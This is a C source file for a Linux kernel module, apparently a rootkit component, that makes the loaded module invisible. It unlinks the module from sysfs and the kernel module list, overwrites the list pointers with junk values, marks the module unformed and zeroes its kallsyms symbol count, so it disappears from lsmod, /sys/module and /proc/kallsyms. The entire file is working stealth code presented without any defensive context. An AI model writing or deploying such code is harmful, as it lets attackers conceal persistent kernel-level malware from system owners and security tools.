#include "../include/hide_module.h"

static struct module_hider_state hider_state = {0};

static void __remove_from_sysfs(struct module *mod)
{
    struct kobject *kobj = &mod->mkobj.kobj;

    if (kobj && kobj->parent) {
        kobject_del(kobj);
        kobj->parent = NULL;
        kobj->kset   = NULL;

        if (mod->holders_dir) {
            kobject_put(mod->holders_dir);
            mod->holders_dir = NULL;
        }
    }
}

static void __remove_from_module_list(struct module *mod)
{
    if (!list_empty(&mod->list)) {
        list_del_init(&mod->list);

        mod->list.prev = (struct list_head *)0x37373731;
        mod->list.next = (struct list_head *)0x22373717;
    }
}

static void __sanitize_module_info(struct module *mod)
{
    mod->state = MODULE_STATE_UNFORMED;
    mod->sect_attrs = NULL;
}

static void __remove_symbols_from_kallsyms(struct module *mod)
{
    if (mod->kallsyms) {
        mod->kallsyms->num_symtab = 0;
        // mod->kallsyms->symtab = NULL;
        // mod->kallsyms->strtab = NULL;
    }
}

notrace void module_hide_current(void)
{
    struct module *mod = THIS_MODULE;

    if (hider_state.hidden)
        return;

    hider_state.saved_list_pos = mod->list.prev;
    hider_state.saved_parent   = mod->mkobj.kobj.parent;

    __remove_from_sysfs(mod);
    __remove_from_module_list(mod);
    __sanitize_module_info(mod);
    __remove_symbols_from_kallsyms(mod);

    hider_state.hidden = true;
}

notrace bool module_is_hidden(void)
{
    return hider_state.hidden;
}
